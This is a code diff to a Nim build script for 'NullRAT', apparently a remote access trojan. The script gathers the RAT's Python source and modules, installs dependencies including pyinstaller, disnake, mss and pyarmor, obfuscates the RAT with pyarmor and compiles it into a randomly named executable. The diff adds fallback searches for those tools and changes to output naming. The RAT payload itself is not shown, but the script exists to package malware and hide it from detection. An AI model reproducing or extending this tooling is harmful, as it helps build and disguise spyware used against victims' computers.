@@ -4,7 +4,6 @@ import std/browsers
 import std/osproc
 import std/random
 import std/envvars
-import std/files
 import std/[strutils, strformat]
 
 randomize()
@@ -25,7 +24,7 @@ proc cleanWorkingDir() =
     if dirExists(absolutePath("NullRAT")):
         createDir("NullRAT2")
         moveFile(absolutePath("NullRAT" / "custom_icon.ico"), dirrr / "NullRAT2" / "custom_icon.ico")
-        moveFile(absolutePath("NullRAT" / "RAT.py"), dirrr / "NullRAT2"    / "RAT.py")
+        moveFile(absolutePath("NullRAT" / "RAT.py"), dirrr / "NullRAT2" / "RAT.py")
         moveDir(absolutePath("NullRAT" / "modules"), dirrr / "NullRAT2" / "modules")
         moveDir(absolutePath("NullRAT" / "upx"), dirrr / "NullRAT2" / "upx")
         # check existing variables
@@ -42,13 +41,14 @@ proc cleanWorkingDir() =
     removeFile("AIO_Legacy.bat")
         
     # remove git stuff if downloaded from source
-    echo "Remove git files? (y/N)"
-    var inpu: char = getch()
-    if inpu == 'y' or inpu == 'Y':
-        removeDir(".git")
-        removeFile("README.md")
-        removeFile("Getting Variables.md")
-        removeFile(".gitignore")
+    if dirExists(absolutePath(".git")):
+        echo "Remove git files? (y/N)"
+        var inpu: char = getch()
+        if inpu == 'y' or inpu == 'Y':
+            removeDir(".git")
+            removeFile("README.md")
+            removeFile("Getting Variables.md")
+            removeFile(".gitignore")
 
     removeFile("RAT.exe")
     removeDir("build")
@@ -130,44 +130,78 @@ proc compiler(): int =
     elif input == 'Q' or input == 'q': return 0
     else:
         stdout.styledWriteLine(fgCyan, {styleBright}, "- Compiling using selected settings...")
-        
         stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyinstaller...")
-        # Find working pyinstaller executable
-        var wherePy = splitLines(execCmdEx("where pyinstaller").output)
         var pyinst: string = "undef";
-        for pyinstaller in wherePy:
-            if pyinstaller == "": continue
-            var code = execCmdEx(pyinstaller).exitCode
-            if code == 2:
-                pyinst = pyinstaller
-                break
-        if "undef" notin pyinst:
-            echo "Found! ", pyinst
-        else:
-            echo "[FATAL] Pyinstaller executable not found."
-            echo "Please check your environment variables and python installation"
-            echo "before continuing..... Exiting in 5 seconds"
-            sleep(5000)
-            return 0
-        
+        var armor: string = "undef";
+        # Find working pyinstaller executable
+        var wherePy: seq[string]
+        try:
+            wherePy = splitLines(execCmdEx("where pyinstaller").output)
+            for pyinstaller in wherePy:
+                if pyinstaller == "": continue
+                var code = execCmdEx(pyinstaller).exitCode
+                if code == 2:
+                    pyinst = pyinstaller
+                    break
+            if "undef" notin pyinst:
+                echo "Found! ", pyinst
+            else:
+                echo "[FATAL] Pyinstaller executable not found."
+                echo "Please check your environment variables and python installation"
+                echo "before continuing..... Exiting in 5 seconds"
+                sleep(5000)
+                return 0
+        except OSError:
+            # Modules not in path, try to find scripts directory
+            echo "Pyinstaller executable not found"
+            echo "Attempting to locate the executable in AppData....."
+            var localappdata = getEnv("localappdata")
+            for path in walkDirRec(localappdata):
+                if "pyinstaller" in path:
+                    echo "Found!", path
+                    pyinst = path
+                    break
+            if "undef" in pyinst:
+                echo "[FATAL] Pyinstaller executable not found."
+                echo "Please check your environment variables and python installation"
+                echo "before continuing..... Exiting in 5 seconds"
+                sleep(5000)
+                return 0
+                
         stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyarmor...")
         # Find working pyarmor executable
-        var whereArmor = splitLines(execCmdEx("where pyarmor-7").output)
-        var armor: string = "undef";
-        for pyarmor in whereArmor:
-            if pyarmor == "": continue
-            var code = execCmdEx(pyarmor).exitCode
-            if code == 2:
-                armor = pyarmor
-                break
-        if "undef" notin armor:
-            echo "Found! ", armor
-        else:
-            echo "[FATAL] Pyarmor executable not found."
-            echo "Please check your environment variables and python installation"
-            echo "before continuing..... Exiting in 5 seconds"
-            sleep(5000)
-            return 0
+        try: 
+            var whereArmor = splitLines(execCmdEx("where pyarmor-7").output)
+            for pyarmor in whereArmor:
+                if pyarmor == "": continue
+                var code = execCmdEx(pyarmor).exitCode
+                if code == 2:
+                    armor = pyarmor
+                    break
+            if "undef" notin armor:
+                echo "Found! ", armor
+            else:
+                echo "[FATAL] Pyarmor executable not found."
+                echo "Please check your environment variables and python installation"
+                echo "before continuing..... Exiting in 5 seconds"
+                sleep(5000)
+                return 0
+        except OSError:
+            # Modules not in path, try to find scripts directory
+            echo "Pyarmor executable not found"
+            echo "Attempting to locate the executable in AppData....."
+            var localappdata = getEnv("localappdata")
+            for path in walkDirRec(localappdata):
+                if "armor" in path:
+                    echo "Found!", path
+                    pyinst = path
+                    break
+            if "undef" in pyinst:
+                echo "[FATAL] Pyarmor executable not found."
+                echo "Please check your environment variables and python installation"
+                echo "before continuing..... Exiting in 5 seconds"
+                sleep(5000)
+                return 0
             
         # Compiling
         stdout.styledWriteLine(fgCyan, {styleBright}, "- Creating tempdir...")
@@ -214,13 +248,15 @@ proc compiler(): int =
         if obfuscate: discard execShellCmd(pyarmor_cmd)
         else: discard execShellCmd(pyinst_cmd)
         
+        var name = $rand(6969) & ".exe"
         if fileExists(currdir / "dist" / "765678976567.exe"):
-            moveFile(currdir / "dist" / "765678976567.exe", dirr / "app.exe")
+            moveFile(currdir / "dist" / "765678976567.exe", dirr / name)
         setCurrentDir(dirr / "NullRAT")
         removeDir(folderName)
         
-        stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful!")
+        stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful! Output in " & name)
         discard getch()
+		quit(0)
     
 proc variablesCreator(x: int) = 
     printName()
@@ -307,10 +343,15 @@ proc packageInstaller() =
         stdout.styledWriteLine(fgGreen, {styleBright}, "- Python installed!")
         echo ""
         stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
-        var result = execCmdEx("pip freeze")
+        var result = execCmdEx("dism")
+        try:
+            result = execCmdEx("pip freeze")
+        except OSError:
+            result = execCmdEx("py -m pip freeze")
         var allInstalled: bool = true
         if result.exitCode != 0:
-            echo "pip command failed to execute!!"
+            echo "[FATAL] pip command failed to execute!!"
+            sleep(2000)
         else:
             for module in pipModules:
                 if module notin result.output:
@@ -329,7 +370,13 @@ proc packageInstaller() =
                     stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                     sleep(2000)
                     variablesCreator(0)
-
+                else:
+                    var res = execShellCmd("py -m pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
+                    if res == 0:
+                        echo "========================"
+                        stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
+                        sleep(2000)
+                        variablesCreator(0)
     else:
         stdout.styledWriteLine({styleBright}, "- Python not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
         var input: char = getch();
@@ -341,6 +388,7 @@ proc packageInstaller() =
         else:
             openDefaultBrowser("https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
             echo ""
+            echo "https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe"
             stdout.styledWriteLine({styleBright}, "Your browser should start downloading the installer already.")
             stdout.styledWriteLine({styleBright}, "Since we do not support automatic installation of python,")
             stdout.styledWriteLine({styleBright}, "you have to run the installer manually.")
